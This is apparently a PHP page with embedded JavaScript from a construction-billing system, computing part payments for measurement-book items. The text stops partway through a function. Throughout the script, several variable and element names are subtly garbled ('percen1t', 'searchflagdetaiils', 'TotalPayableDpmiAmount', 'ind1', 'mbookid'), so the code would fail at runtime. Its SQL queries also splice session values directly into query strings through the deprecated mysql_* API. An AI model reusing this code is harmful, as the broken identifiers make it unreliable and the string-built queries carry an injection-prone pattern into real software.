<?php
//session_start();
@ob_start();
require_once 'library/config.php'; 
require_once 'library/functions.php';
require_once 'library/binddata.php';
checkUser();
include "library/common.php";
$msg = '';
function dt_display($ddmmyyyy)
{
 $dt=explode('-',$ddmmyyyy); 
 $dd=$dt[2];
 $mm=$dt[1];
 $yy=$dt[0];
 return $dd . '/' . $mm . '/' . $yy;
}
function checkPartpayment($DpmArrMbidList,$Key)
{
	$InitKey = $Key;
	while($perc = current($DpmArrMbidList)) 
	{
		if ($perc == $InitKey) 
		{
			//echo key($DpmArrPayPercentList).'<br />';
			$res .= key($DpmArrMbidList)."*";
		}
		next($DpmArrMbidList);
	}
	return rtrim($res,"*");
}

function removeArray($res,$array)
{
	$explodeRes = explode("*",rtrim($res,"*"));
	for($i=0; $i<count($explodeRes);$i++)
	{
		$RemKey = $explodeRes[$i];
		unset($array[$RemKey]);
	}
	return $array;
}
if($_POST['Submit'] == 'Submit')
{
	header('Location: AbstMBook_Partpay_nextlevel.php');
}
$staffid = $_SESSION['sid'];
$userid  = $_SESSION['userid'];
$rbn     = $_SESSION["rbn"]; 
$abstsheetid    = $_SESSION["abstsheetid"];   $abstmbno = $_SESSION["abs_mbno"];  $abstmbpage  = $_SESSION["abs_page"];	
$fromdate       = $_SESSION['fromdate'];      $todate   = $_SESSION['todate'];    $abs_mbno_id = $_SESSION["abs_mbno_id"];
$paymentpercent = $_SESSION["paymentpercent"];
//$deletembook_temp_sql = "DELETE FROM measurementbook_temp where sheetid = '$abstsheetid'";
//$deletembook_temp_query = mysql_query($deletembook_temp_sql);
$checkPartpay_sql = "select * from measurementbook_temp where sheetid = '$abstsheetid'";
$checkPartpay_query = mysql_query($checkPartpay_sql);
if(mysql_num_rows($checkPartpay_query)>0)
{
	$check = 1;
}
else
{
	$check = 0;
	$insermbook_temp_sql = "INSERT INTO measurementbook_temp (measurementbookdate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  pay_percent, flag, part_pay_flag, rbn, active, userid, is_finalbill)
SELECT mbgeneratedate, staffid, sheetid, divid, subdivid, fromdate, todate, mbno, mbpage, mbtotal, abstmbookno, abstmbpage,  '100', flag, 0, rbn, active, userid, is_finalbill FROM mbookgenerate where mbookgenerate.sheetid = '$abstsheetid'";
$insermbook_temp_query = mysql_query($insermbook_temp_sql);
}


$query = "SELECT    sheet_id, sheet_name, work_order_no, work_name, short_name, tech_sanction, name_contractor, agree_no, rbn, rebate_percent FROM sheet WHERE sheet_id ='$abstsheetid' ";
//echo $query;
$sqlquery = mysql_query($query);
if ($sqlquery == true) 
{
    $List = mysql_fetch_object($sqlquery);
    $work_name = $List->work_name; 
	$short_name = $List->short_name;   
	$tech_sanction = $List->tech_sanction;  
    $name_contractor = $List->name_contractor;    
	$agree_no = $List->agree_no; 
	$overall_rebate_perc = $List->rebate_percent; 
	$runn_acc_bill_no = $rbn;
	$work_order_no = $List->work_order_no; /*   if($List->rbn == 0){$runn_acc_bill_no =1;  } else { $runn_acc_bill_no=$List->rbn +1;}*/
	$length = strlen($work_name);
 	$start_line = ceil($length/70);  
//    $querys = "SELECT mb_id, sheet_id, mb_date, fromdate, todate, mb_no, mb_page, rbn, active FROM mbookgenerate WHERE active =1
//        AND sheet_id ='$abstsheetid'  AND mb_id in(1,2)";//'$id'";
////echo $querys;
//$sqlquerys = mysql_query($querys);
//$Lists = mysql_fetch_object($sqlquerys);
// $mb_page = $Lists->mb_page;
}
//echo $check;
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    <title>Abstrack MBook</title>
    <link rel="stylesheet" href="script/font.css" />
</head>
<script language="javascript" type="text/javascript" src="script/Date_Calendar.js"></script>
<script language="javascript" type="text/javascript" src="script/validfn.js"></script>
<link rel="stylesheet" href="css/button_style.css"></link>
<link rel="stylesheet" href="js/jquery-ui.css">
<script src="js/jquery-1.10.2.js"></script>
<script src="js/jquery-ui.js"></script>
<link rel="stylesheet" href="/resources/demos/style.css">
<link rel="stylesheet" href="Font style/font.css" />
<link type='text/css' href='css/basic.css' rel='stylesheet' media='screen' />
<script type='text/javascript' src='js/basic_model_jquery.js'></script>
<script type='text/javascript' src='js/jquery.simplemodal.js'></script>
<link rel="stylesheet" href="css/font-awesome.css" />
<!--<script type='text/javascript' src='js/basic.js'></script>-->
<script src="dist/sweetalert-dev.js"></script>
<link rel="stylesheet" href="dist/sweetalert.css">
<script type="text/javascript" language="javascript">
	function goBack()
	{
		url = "AbsGenerate_Partpay.php";
		window.location.replace(url);
	}
	function ValidatePercent(obj,section,idcount)
	{
		//alert(idcount);
		var value = obj.value;
		if(Number(value)>100)
		{
			swal("", "Entered % should be less than 100..!", "error"); 
			obj.value = "";
			document.getElementById("hid_slm_result"+idcount).value = "";
			totalAmountCalculation("slm");
			return false;
		}
		if(section == "dpm")
		{
			var paid_percent_dpm = document.getElementById("txt_partpay_percent_dpm"+idcount).value;
			var remain_percent_dpm = 100-Number(paid_percent_dpm);
			if(value > remain_percent_dpm)
			{
				swal("Entered Percentage should be less than: ", remain_percent_dpm+" %", "error");
				obj.value = "";
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
				totalAmountCalculation("dpm");
				return false;
			}
		}
	}
	function ValidateSlm()
	{
		var slmqty = document.getElementById("hid_slm_qty").value;
		var qty = 0;
		$('input[name="txt_partpay_qty_slm[]"]').each(function() {
			var currentqty = $(this).val();
			qty = (Number(qty)+Number(currentqty));
			if(qty>slmqty)
			{
				swal("", "Quantity Not Allowed..:)", "error"); 
				//$(this).val() = "";
				//return false;    updated on 03.11.2016
			}
		});
	}
	function setRowSpan() 
	{
		var i;
		var rowcount =  document.getElementById("table_group_count").value;
		for(i=0; i<rowcount; i++)
		{
			var row_span = document.getElementById("row_count"+i).value;
			document.getElementById("td_popupbutton"+i).rowSpan = row_span;
			var ht = document.getElementById("td_popupbutton"+i);
			 var checkbox_height = ht.offsetHeight;
			 //document.getElementById('ch_item'+i).offsetHeight = checkbox_height;
			 document.getElementById("ch_item"+i).style.height = checkbox_height+"px";
			 //document.getElementById("ch_item"+i).style.width = checkbox_height+"px";
			
		}
	}
	//var index = 1;
	function addRow()
	{
		var x = Number(document.getElementById("table4").rows.length);
		 	 index = x;
		//var arg = "X"+"*"+index;
		var rate = document.getElementById("txt_item_rate_slm0").value;
		var table=document.getElementById("table4");
        var row=table.insertRow(table.rows.length-2);
        	row.id = "rowid"+index;
			row.style.align = "center";
			
		var cell1=row.insertCell(0);
			cell1.setAttribute('class', "dynamicrowcell");
			cell1.style.padding = "0px 0px 0px 0px";
				
		var txt_box1 = document.createElement("input");
			txt_box1.name = "txt_partpay_qty_slm[]";
            txt_box1.id = "txt_partpay_qty_slm"+index;
			//txt_box1.value = row.id;
			txt_box1.style.width = 93+"px";
			txt_box1.style.border = "1px solid #2aade4";
			txt_box1.style.textAlign = "right";
			txt_box1.setAttribute('class', "dynamictextbox"); 
            cell1.appendChild(txt_box1);
			/*txt_box1.onblur= function () {
								ValidateSlm();
                        	  calculateAmount(this,index,"qty","slm")
                    		}*/
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm")
												ValidateSlm();
												};
											})(index); 
		var cell2=row.insertCell(1);
			cell2.setAttribute('class', "dynamicrowcell");	
			cell2.style.padding = "0px 0px 0px 0px";
		var txt_box2 = document.createElement("input");
			txt_box2.name = "txt_item_rate_slm";
            txt_box2.id = "txt_item_rate_slm"+index;
			txt_box2.value = Number(rate).toFixed(2);
			txt_box2.style.textAlign = "right";
			txt_box2.style.width = 80+"px";
			//txt_box2.readOnly = true;
			txt_box2.setAttribute('class', "dynamictextbox"); 
            cell2.appendChild(txt_box2);
			/*txt_box2.onblur= function () {
                        	  calculateAmount(this,index,"rate","slm")
                    		}*/
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm")
												ValidateSlm();
												};
											})(index); 
		var cell3=row.insertCell(2);
			cell3.setAttribute('class', "dynamicrowcell");	
			cell3.style.padding = "0px 0px 0px 0px";
		var txt_box3 = document.createElement("input");
			txt_box3.name = "txt_partpay_percent_slm";
            txt_box3.id = "txt_partpay_percent_slm"+index;
			//txt_box3.value = txt_box3.id;
			txt_box3.style.width = 40+"px";
			txt_box3.style.textAlign = "right";
			txt_box3.style.border = "1px solid #2aade4";
			txt_box3.setAttribute('class', "dynamictextbox"); 
			/*txt_box3.onblur= function () {
                        	  calculateAmount(this,index,"percent","slm");
							  ValidatePercent(this)
                    		}*/
							txt_box3.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm")
												ValidatePercent(this,"slm",ind);
												};
											})(index);
            cell3.appendChild(txt_box3);
							
		var cell4=row.insertCell(3);
			cell4.setAttribute('class', "dynamicrowcell");	
			cell4.style.padding = "0px 0px 0px 0px";
		var txt_box4 = document.createElement("input");
			txt_box4.name = "txt_partpay_amt_slm[]";
            txt_box4.id = "txt_partpay_amt_slm"+index;
			txt_box4.style.width = 130+"px";
			txt_box4.style.textAlign = "right";
			txt_box4.style.pointerEvents = "none";
			txt_box4.setAttribute('class', "dynamictextbox"); 
            cell4.appendChild(txt_box4);
		
		var cell5=row.insertCell(4);
			//cell5.style.width = 10+"px";
			cell5.style.textAlign = "center";
			cell5.style.padding = "0px 0px 0px 0px";
        var delbtn=document.createElement("input");
        	delbtn.type = "button";
        	delbtn.value = " X ";
        	delbtn.id = "btn_delete"+index;
			delbtn.name = "btn_delete";
			delbtn.setAttribute('class', "delbtnstyle");
			delbtn.style.width = 32+"px";
			delbtn.style.borderRadius = 0+"px";
        	delbtn.onclick = function () {
                        	  deleteRow(this);
                    		}
        	cell5.appendChild(delbtn);
			
			//var cell6=row.insertCell(5);
			//cell5.style.width = 10+"px";
			//cell6.style.textAlign = "center";
			//cell6.style.padding = "0px 0px 0px 0px";
			//cell6style.visibility = "hidden";	
			
	// BELOW FIELD IS HIDDEN BOX FIELD....SO APPEND IN ADD & DELETE BUTTON FIELD ITSELF..No seperate TD(cell) creation for this. check above ( index++ : line)
		var txt_box5 = document.createElement("input");
        	txt_box5.type = "hidden";
        	txt_box5.id = "hid_slm_result"+index;
			txt_box5.name = "hid_slm_result[]";
			txt_box5.setAttribute('class', "dynamictextbox");
			txt_box5.style.width = 70+"px";
			txt_box5.style.borderRadius = 0+"px";
			cell5.appendChild(txt_box5);
			index++;
	}
	function deleteRow(obj) 
	{
	   //var row = document.getElementById(id);
	   //row.parentNode.removeChild(row);
	   /*$('input[name = "btn_delete"]').click(function(){
		   $(this).closest('tr').remove()
		})*/
		var tr = $(obj).closest('tr');
		tr.remove();
	   totalAmountCalculation("slm");
	   return true;
	}
	function calculateAmount(obj,id,type,section)
	{
		var idcount = id;
		var currentvalue = obj.value;
		var itemid = document.getElementById("txt_item_id").value;
		var currentrbn = document.getElementById("txt_rab_no").value;
		if(section == "slm")
		{
			if(type == "qty")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var qty = currentvalue;
				//alert(percent)
			}
			if(type == "rate")
			{
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = document.getElementById("txt_partpay_percent_slm"+idcount).value;
				var rate = currentvalue;
			}
			if(type == "percent")
			{
				var rate = document.getElementById("txt_item_rate_slm"+idcount).value;
				var qty = document.getElementById("txt_partpay_qty_slm"+idcount).value;
				var percent = currentvalue;
			}
			qty = Number(qty);
			//alert(qty)
			rate = Number(rate);
			//alert(rate)
			percent = Number(percent);
			//alert(percent)
			if((qty != "") && (rate != "") && (percent != ""))
			{
				var amount = qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
			}
			else
			{
				// Added on 03.02.2017 for 0% payment for SLM item
				var amount = 0;//qty * rate * percent / 100;
				document.getElementById("txt_partpay_amt_slm"+idcount).value = 0;//Number(amount).toFixed(2);
				var result = percent + "*" + currentrbn + "*" + qty + "*" + itemid;
				document.getElementById("hid_slm_result"+idcount).value = result;
				//document.getElementById("txt_partpay_amt_slm"+idcount).value = "";
				//document.getElementById("hid_slm_result"+idcount).value = "";
			}
		}
		if(section == "dpm")
		{
			var rate_dpm 	= document.getElementById("txt_item_rate_dpm"+idcount).value;
			var qty_dpm 	= document.getElementById("txt_partpay_qty_dpm"+idcount).value;
			var rbn_dpm 	= document.getElementById("txt_rbn_dpm"+idcount).value;
			var mbid_dpm 	= document.getElementById("hid_dpm_mbid"+idcount).value;
			var percent_dpm = currentvalue;
				qty_dpm 	= Number(qty_dpm);
				rate_dpm 	= Number(rate_dpm);
				percent_dpm = Number(percent_dpm);
			if((qty_dpm != "") && (rate_dpm != "") && (percent_dpm != ""))
			{
				var amount_dpm = qty_dpm * rate_dpm * percent_dpm / 100;
				document.getElementById("txt_amt_dpm_payable"+idcount).value = Number(amount_dpm).toFixed(2);
				var result = percent_dpm + "*" + currentrbn + "*" + qty_dpm + "*" + itemid + "*" + rbn_dpm + "*" + mbid_dpm;
				//alert(result)
				document.getElementById("hid_dpm_result"+idcount).value = result;
			}
			else
			{
				document.getElementById("txt_amt_dpm_payable"+idcount).value = "";
				document.getElementById("hid_dpm_result"+idcount).value = "";
			}
		}
		totalAmountCalculation(section);
		
		return true;
	}
	
	function totalAmountCalculation(section)
	{
		var amount = 0;
		if(section == "slm")
		{
			$('input[name="txt_partpay_amt_slm[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var DpmPayableAmount = document.getElementById("txt_partpay_total_payableamt_dpm").value;
			//if(DpmPayableAmount == ""){ DpmPayableAmount = 0; }
			var OverAllAmount = Number(amount)+Number(DpmPayableAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_amt_slm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_amt_slm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
		if(section == "dpm")
		{
			$('input[name="txt_amt_dpm_payable[]"]').each(function() {
				var amt = $(this).val();
				amount = (Number(amount)+Number(amt));
			});
			
			var SlmTotalAmount = document.getElementById("txt_partpay_total_amt_slm").value;
			//if(SlmTotalAmount == ""){ SlmTotalAmount = 0; }
			var OverAllAmount = Number(amount)+Number(SlmTotalAmount);
			
			if(amount>0)
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(amount).toFixed(2);
			}
			else
			{
				document.getElementById("txt_partpay_total_payableamt_dpm").value = "";
			}
			document.getElementById("txt_overall_total").value = Number(OverAllAmount).toFixed(2);
		}
	}
	
	function getDPMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp;
		var data;
		var i, rbn, qty, percent, measurementbookid, searchflag, RemarkData ="", newrow = "",TotalPaidDpmAmount = 0,TotalPayableDpmAmount = 0; 
		var currentrbn = document.getElementById("txt_rab_no").value;
		var rate = Number(rate);	
		var dpmitemQty = document.getElementById("hid_dpm_qty").value;
		if(Number(dpmitemQty) == 0)
		{
			document.getElementById("dpmheadrow1").className 	= "hide";
			document.getElementById("dpmheadrow2").className 	= "hide";
			document.getElementById("dpmtotalrow").className 	= "hide";
			document.getElementById("dpmremarksrow").className 	= "hide";
		}
		else
		{
			document.getElementById("dpmheadrow1").className 	= "";
			document.getElementById("dpmheadrow2").className 	= "";
			document.getElementById("dpmtotalrow").className	= "";
			document.getElementById("dpmremarksrow").className 	= "";
		}
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_dpm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText;
				if(data != "")
				{
					var details = data.split("*");
					var index = 1;
					for(i=0; i<details.length; i+=6)
					{
						RemarkData = ""; 
						rbn 				= details[i];
						qty 				= details[i+1];
						percent 			= details[i+2];
						measurementbookid 	= details[i+3];
						searchflag 			= details[i+4];
						PayableDpmSlmPercent 		= details[i+5];
						if((PayableDpmSlmPercent != "") && (PayableDpmSlmPercent != "X"))
						{
							var PayableSlmDpmAmt = Number(qty)*Number(PayableDpmSlmPercent)*Number(rate)/100;
								TotalPayableDpmAmount = (Number(TotalPayableDpmiAmount)+Number(PayableSlmDpmAmt));
							var result = PayableDpmSlmPercent + "*" + currentrbn + "*" + qty + "*" + itemid + "*" + rbn + "*" + measurementbookid;
						}
						else
						{
							var PayableSlmDpmAmt = 0;
							var result = "";
						}
						//alert(searchflag)
						
						
						if((searchflag != "") && (searchflag != "X"))
						{
							var searchflagdetails = searchflag.split("@");
							
								RemarkData  = "<table style='color:blue;font-family:verdana;font-size:13px;' class='table1' align='center' width='80%' bgcolor=''>";
								RemarkData += "<tr height='30px' style='color:white;font-family:verdana;font-size:13px;background-color:#078c9b;'><td colspan = '3'>Quantity : "+qty+"</td></tr>";
								RemarkData += "<tr height='27px' style='color:white;font-family:verdana;font-size:13px;background-color:#a5b23c;'><td>RBN No.</td><td>Date</td><td>Paid Percent ( % )</td></tr>";
								for(j=0; j<searchflagdetails.length; j+=3)
								{
									remarkPercent 	= searchflagdetaiils[j+0];
									remarkRbn 		= searchflagdetaiils[j+1];
									remarkDate 		= searchflagdetaiils[j+2];
									
									if((remarkPercent != "") && (remarkPercent != "X"))
									{
										//alert(remarkPercent)
										//alert(remarkRbn)
										RemarkData += "<tr id='trid"+j+"'><td>"+remarkRbn+"</td><td>"+remarkDate+"</td><td>"+remarkPercent+"</td></tr>";
									}
								}
								RemarkData += "</table>";
						}
						//var rate = document.getElementById("txt_item_rate_slm0").value;
						var amount = Number(qty)*Number(percent)*Number(rate)/100;
						 	TotalPaidDpmAmount = (Number(TotalPaidDpmAmount)+Number(amount));
						var table = document.getElementById("table3");
						var row = table.insertRow(table.rows.length-2);
							row.id = "rowid_dpm"+index;
							row.style.align = "center";
							
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "");
							cell1.style.textAlign = "center";	
							cell1.style.padding = "0px 0px 0px 0px";
						if(searchflag == "X")
						{	
							var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
						}
						else
						{
							var txt_box1 = document.createElement("input");
							txt_box1.type = "hidden";
							txt_box1.name = "txt_rbn_dpm";
							txt_box1.id = "txt_rbn_dpm"+index;
							txt_box1.value = rbn;
							txt_box1.style.width = 37+"px";
							txt_box1.style.textAlign = "center";
							txt_box1.style.pointerEvents = "none";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							
							var srch_btn1 = document.createElement("input");
							srch_btn1.type = "image";
							srch_btn1.name = "srch_btn_dpm";
							srch_btn1.style.textAlign = "center";
							srch_btn1.id = "srch_btn_dpm"+index;
							srch_btn1.src = "images/search (10).png";
							srch_btn1.style.width = 25+"px";
							srch_btn1.style.height = 20+"px";
							
							var txt_remarkdata_dpm_1 = document.createElement("input");
								txt_remarkdata_dpm_1.type = "hidden";
								txt_remarkdata_dpm_1.id = "hid_dpm_remarkdata"+index;
								txt_remarkdata_dpm_1.name = "hid_dpm_remarkdata[]";
								txt_remarkdata_dpm_1.value = RemarkData;
								txt_remarkdata_dpm_1.setAttribute('class', "dynamictextbox");
								txt_remarkdata_dpm_1.style.width = 70+"px";
								txt_remarkdata_dpm_1.style.borderRadius = 0+"px";
								cell1.appendChild(txt_remarkdata1_dpm_1);
							
							//srch_btn1.style.textAlign = "center";
							//srch_btn1.style.pointerEvents = "none";
							//srch_btn1.setAttribute('class', "dynamictextbox"); 
							/*txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index);*/
							cell1.appendChild(srch_btn1);
							srch_btn1.onclick = (function (ind) {
												return function() {
												  ShowRemarks(ind1)
												  };
												})(index);
							/*srch_btn1.onclick = function () {
												  ShowRemarks(RemarkData)
												}*/
						}
								
							
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_partpay_qty_dpm";
							txt_box2.id = "txt_partpay_qty_dpm"+index;
							txt_box2.value = Number(qty).toFixed(3);
							txt_box2.style.width = 90+"px";
							txt_box2.style.textAlign = "right";
							txt_box2.style.pointerEvents = "none";
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_item_rate_dpm";
							txt_box3.id = "txt_item_rate_dpm1"+index;
							txt_box3.value = Number(rate).toFixed(2);
							txt_box3.style.width = 80+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.pointerEvents = "none";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_percent_dpm";
							txt_box4.id = "txt_partpay_percent_dpm1"+index;
							txt_box4.value = Number(percent);
							txt_box4.style.width = 35+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						var cell5=row.insertCell(4);
							cell5.setAttribute('class', "dynamicrowcell");	
							cell5.style.padding = "0px 0px 0px 0px";
						var txt_box5 = document.createElement("input");
							txt_box5.name = "txt_partpay_amt_dpm";
							txt_box5.id = "txt_partpay_amt_dpm"+index;
							txt_box5.value = Number(amount).toFixed(2);
							txt_box5.style.width = 110+"px";
							txt_box5.style.textAlign = "right";
							txt_box5.style.pointerEvents = "none";
							txt_box5.setAttribute('class', "dynamictextbox"); 
							cell5.appendChild(txt_box5);
							
						var cell6=row.insertCell(5);
							cell6.setAttribute('class', "dynamicrowcell");	
							cell6.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box6 = document.createElement("input");
								txt_box6.name = "txt_percent_dpm_payable";
								txt_box6.id = "txt_percent_dpm_payable1"+index;
								txt_box6.value = Number(PayableDpmSlmPercent);
								txt_box6.style.width = 35+"px";
								txt_box6.style.border = "1px solid #2aade4";
								txt_box6.style.backgroundColor = "#ffffff";
								txt_box6.style.textAlign = "right";
								txt_box6.setAttribute('class', "dynamictextbox");
								txt_box6.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","dpm");
												ValidatePercent(this,"dpm",ind);
												};
											})(index); 
								cell6.appendChild(txt_box6);
						}
						else
						{
							cell6.innerHTML = "";
						}
							
						var cell7=row.insertCell(6);
							cell7.setAttribute('class', "dynamicrowcell");	
							cell7.style.padding = "0px 0px 0px 0px";
						if(percent < 100)
						{
							var txt_box7 = document.createElement("input");
								txt_box7.name = "txt_amt_dpm_payable1[]";
								txt_box7.id = "txt_amt_dpm_payable"+index;
								txt_box7.value = Number(PayAbleSlmDpmAmt).toFixed(2);
								txt_box7.style.width = 110+"px";
								txt_box7.style.textAlign = "right";
								txt_box7.style.pointerEvents = "none";
								txt_box7.setAttribute('class', "dynamictextbox"); 
								cell7.appendChild(txt_box7);
						}
						else
						{
							cell7.innerHTML = "";
						}
						
						var txt_box8 = document.createElement("input");
							txt_box8.type = "hidden";
							txt_box8.id = "hid_dpm_result"+index;
							txt_box8.name = "hid_dpm_result[]";
							txt_box8.value = result;
							txt_box8.setAttribute('class', "dynamictextbox");
							txt_box8.style.width = 70+"px";
							txt_box8.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box8);
							
						var txt_box9 = document.createElement("input");
							txt_box9.type = "hidden";
							txt_box9.id = "hid_dpm_mbid"+index;
							txt_box9.name = "hid_dpm_mbid";
							txt_box9.value = mbookid;
							txt_box9.setAttribute('class', "dynamictextbox");
							txt_box9.style.width = 70+"px";
							txt_box9.style.borderRadius = 0+"px";
							cell7.appendChild(txt_box9);
						index++;	
					}
					document.getElementById("txt_partpay_total_paidamt_dpm").value = Number(TotalPaidDpmAmount).toFixed(2);
					document.getElementById("txt_partpay_total_payableamt_dpm").value = Number(TotalPayableDpmAmount).toFixed(2);
				}
				
			}
		}
		xmlHttp.send(strURL);	
	}
	
	function getSLMdetaiils(sheetid,itemid,rate)
	{
		var xmlHttp; 
		var data;
		var i, rbn, qty, percent, newrow = "", amt;
		var slmitemQty = document.getElementById("hid_slm_qty").value;
		if(Number(slmitemQty) == 0)
		{
			document.getElementById("rowid0").className = "hide";
			document.getElementById("slmheadrow").className = "hide";
			document.getElementById("slmtotalrow").className = "hide";
			document.getElementById("slmremarksrow").className = "hide";
		}
		else
		{
			document.getElementById("rowid0").className = "";
			document.getElementById("slmheadrow").className = "";
			document.getElementById("slmtotalrow").className = "";
			document.getElementById("slmremarksrow").className = "";
		}
		var rate = Number(rate);	
		if(window.XMLHttpRequest) // For Mozilla, Safari, ...
		{
			xmlHttp = new XMLHttpRequest();
		}
		else if(window.ActiveXObject) // For Internet Explorer
		{ 
			xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
		}
		strURL="find_slm_details.php?sheetid="+sheetid+"&itemid="+itemid;
		xmlHttp.open('POST', strURL, true);
		xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
		xmlHttp.onreadystatechange = function()
		{
			if (xmlHttp.readyState == 4)
			{
				data=xmlHttp.responseText; 
				if(data != "")
				{
					
					var x = Number(document.getElementById("table4").rows.length);
					var index = x;
					var Splitdata = data.split("@@");
					var SlmRemarks = Splitdata[1];
					var SlmDetails = Splitdata[0];
					var details = SlmDetails.split("*");
					for(i=0; i<details.length; i+=3)
					{
						//var arr = index;
						var arg = "X"+"*"+index;
							rbn 	= details[i];
							qty 	= details[i+1];
							percent = details[i+2];
							var result = percent+"*"+rbn+"*"+qty+"*"+itemid;
							amt 	= Number(qty)*Number(rate)*Number(percent)/100;
						var table=document.getElementById("table4");
						var row=table.insertRow(table.rows.length-2);
							row.id = "rowid"+index;
							row.style.align = "center";
						var cell1=row.insertCell(0);
							cell1.setAttribute('class', "dynamicrowcell");
							cell1.style.padding = "0px 0px 0px 0px";
								
						var txt_box1 = document.createElement("input");
							txt_box1.name = "txt_partpay_qty_slm1[]";
							txt_box1.id = "txt_partpay_qty_slm"+index;
							txt_box1.value = Number(qty);
							txt_box1.style.width = 93+"px";
							txt_box1.style.border = "1px solid #2aade4";
							txt_box1.style.textAlign = "right";
							txt_box1.setAttribute('class', "dynamictextbox"); 
							cell1.appendChild(txt_box1);
							txt_box1.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"qty","slm");
												};
											})(index);
						var cell2=row.insertCell(1);
							cell2.setAttribute('class', "dynamicrowcell");	
							cell2.style.padding = "0px 0px 0px 0px";
						var txt_box2 = document.createElement("input");
							txt_box2.name = "txt_item_rate_slm1";
							txt_box2.id = "txt_item_rate_slm1"+index;
							txt_box2.value = Number(rate).toFixed(2);
							txt_box2.style.textAlign = "right";
							txt_box2.style.width = 80+"px";
							//txt_box2.readOnly = true;
							txt_box2.setAttribute('class', "dynamictextbox"); 
							cell2.appendChild(txt_box2);
							txt_box2.onblur = (function (ind) {
												return function() {
												calculateAmount(this,ind,"rate","slm");
												};
											})(index);
						var cell3=row.insertCell(2);
							cell3.setAttribute('class', "dynamicrowcell");	
							cell3.style.padding = "0px 0px 0px 0px";
						var txt_box3 = document.createElement("input");
							txt_box3.name = "txt_partpay_percent_slm1";
							txt_box3.id = "txt_partpay_percent_slm1"+index;
							txt_box3.value = percen1t;
							txt_box3.style.width = 40+"px";
							txt_box3.style.textAlign = "right";
							txt_box3.style.border = "1px solid #2aade4";
							txt_box3.setAttribute('class', "dynamictextbox"); 
							cell3.appendChild(txt_box3);
							txt_box3.onblur= (function (ind) {
												return function() {
												calculateAmount(this,ind,"percent","slm");
												ValidatePercent(this,"slm",ind);
												};
											})(index);
											
						var cell4=row.insertCell(3);
							cell4.setAttribute('class', "dynamicrowcell");	
							cell4.style.padding = "0px 0px 0px 0px";
						var txt_box4 = document.createElement("input");
							txt_box4.name = "txt_partpay_amt_slm1[]";
							txt_box4.id = "txt_partpay_amt_slm"+index;
							txt_box4.value = Number(amt).toFixed(2);
							txt_box4.style.width = 130+"px";
							txt_box4.style.textAlign = "right";
							txt_box4.style.pointerEvents = "none";
							txt_box4.setAttribute('class', "dynamictextbox"); 
							cell4.appendChild(txt_box4);
						
						
						if(i == 0)
						{
							var cell5=row.insertCell(4);
								//cell5.style.width = 10+"px";
								cell5.style.textAlign = "center";
								cell5.style.padding = "0px 0px 0px 0px";
